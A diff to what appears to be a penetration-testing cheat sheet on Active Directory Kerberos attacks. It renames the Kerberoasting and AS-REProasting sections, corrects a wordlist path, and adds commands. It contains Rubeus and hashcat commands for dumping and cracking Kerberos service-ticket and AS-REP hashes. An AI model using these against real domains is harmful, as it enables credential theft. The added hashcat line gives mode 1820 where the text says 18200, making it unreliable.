@@ -296,7 +296,7 @@ The safest to pick is **services.exe**.
 
 ---
 
-### IMPACKET-GETUSERSPNS
+### Kerberoasting
 
 ### Principle
 
@@ -323,8 +323,8 @@ SPN (Service Principal Name) is the mapping between a service and the account or
 
 
  > 
- > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordkists/rockyou.txt</font>**</br>
- > Crack Kerberos 5 TGS-REP hash.
+ > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
+ > Crack Kerberos KRB_TGS_REP hash.
 
 #### With RUBEUS (on target machine)
 
@@ -335,8 +335,8 @@ SPN (Service Principal Name) is the mapping between a service and the account or
 
 
  > 
- > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordkists/rockyou.txt</font>**</br>
- > Crack Kerberos 5 TGS-REP hash.
+ > **<font color=red>hashcat -a 0 -m 13100</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
+ > Crack Kerberos KRB_TGS_REP hash.
 
 ### Mitigation
 
@@ -345,14 +345,20 @@ SPN (Service Principal Name) is the mapping between a service and the account or
 
 ---
 
-### Find AS-REProastable Hash
+### AS-REProasting
 
-#### With Rubeus
+This attack require users with pre-authentication disabled.
+
 
  > 
  > **<font color=red>Rubeus.exe asreproast</font>**</br>
   
- > Run AS-REP roast command looking for vulnerable users.  (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).
+ > Dump Kerberos hashes of AS_REProastable users. (Then Insert `23$` after `$krb5asrep$` and use `hashcat -m 18200`).
+
+
+ > 
+ > **<font color=red>hashcat -a 0 -m 1820</font> myHash.txt <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
+ > Crack Kerberos KRB_AS_REP hash.
 
 # Golden/Silver Ticket
 
